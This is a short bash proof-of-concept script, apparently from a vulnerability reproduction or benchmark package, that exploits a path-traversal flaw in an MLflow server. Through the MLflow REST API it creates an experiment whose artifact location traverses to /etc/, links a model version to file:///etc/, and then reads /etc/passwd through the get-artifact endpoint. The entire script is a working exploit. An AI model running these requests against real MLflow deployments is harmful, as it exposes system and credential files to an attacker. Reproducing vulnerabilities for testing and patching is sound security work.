#!/bin/bash

#cd ../../../codebase

#git checkout c01c02a315431fddd40f6b18f1d8791d4cdd20da


# Wait for the MLflow server to start
sleep 5

echo "Creating malicious experiment..."
RESPONSE=$(curl -s -X POST -H 'Content-Type: application/json' \
    -d '{"name": "poc", "artifact_location": "http:///#/../../../../../../../../../../../../../../etc/"}' \
    'http://127.0.0.1:5000/ajax-api/2.0/mlflow/experiments/create')

EXPERIMENT_ID=$(echo $RESPONSE | jq -r '.experiment_id')
echo "Experiment created with ID: $EXPERIMENT_ID"

echo "Associating a run to the experiment..."
RUN_RESPONSE=$(curl -s -X POST -H 'Content-Type: application/json' \
    -d "{\"experiment_id\": \"$EXPERIMENT_ID\"}" \
    'http://127.0.0.1:5000/api/2.0/mlflow/runs/create')

RUN_ID=$(echo $RUN_RESPONSE | jq -r '.run.info.run_id')
echo "Run associated with ID: $RUN_ID"

echo "Creating registered model..."
curl -s -X POST -H 'Content-Type: application/json' \
    -d '{"name": "poc"}' \
    'http://127.0.0.1:5000/ajax-api/2.0/mlflow/registered-models/create'
echo "Registered model created."

echo "Linking model version to the malicious run..."
curl -s -X POST -H 'Content-Type: application/json' \
    -d "{\"name\": \"poc\", \"run_id\": \"$RUN_ID\", \"source\": \"file:///etc/\"}" \
    'http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create'
echo "Model version linked to run."

echo "Attempting to read /etc/passwd..."
curl 'http://127.0.0.1:5000/model-versions/get-artifact?path=passwd&name=poc&version=1'


echo "$EXPERIMENT_ID" > experiment_id.txt
echo "$RUN_ID" > run_id.txt

# Keep mlflow running for verification
echo "Exploit setup complete. mlflow server is running."